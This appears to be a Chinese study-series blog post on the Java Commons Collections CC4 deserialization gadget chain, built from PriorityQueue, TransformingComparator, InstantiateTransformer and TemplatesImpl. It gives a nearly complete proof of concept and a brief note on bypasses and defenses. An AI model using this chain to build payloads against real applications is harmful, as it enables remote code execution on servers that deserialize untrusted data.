---
title: "Java CC · CC4：PriorityQueue + InstantiateTransformer (4.x 完全体)"
series: java-cc-deserialization
series_order: 5
date: 2026-04-25 10:40:00 +0800
categories:
  - javaCC
---
# CC4：4.x 版本的完全体


### 为什么需要 CC4？
CC4 是 CC2 和 CC3 的结合体。CC2 虽然适配了 CC 4.x，但其执行器 `InvokerTransformer` 在 4.1 中被禁；CC3 虽然绕过了黑名单，但其常用入口受限于 JDK 版本。CC4 取长补短：使用 CC2 的 `PriorityQueue` 入口，配合 CC3 的 `InstantiateTransformer` 执行器。

### 完整 POC
```java
package com.nk7;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections4 {
    public static void main(String[] args) throws Exception {
        // 字节码构造同 CC3
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][]{code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        // 假链 + 真链
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] realTransformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1); // 占位
        queue.add(2);

        // 反射替换
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, realTransformers);

        serialize(queue);
        unserialize("ser.bin");
    }
}
```

### 绕过与防护分析
CC4 完美绕过了 CC 4.1 对 `InvokerTransformer` 的限制，并且不受 JDK 8u71 修复 `AnnotationInvocationHandler` 的影响。这迫使防御者必须从更底层（如序列化过滤器）或应用层面（如依赖升级、WAF 拦截）进行防护。
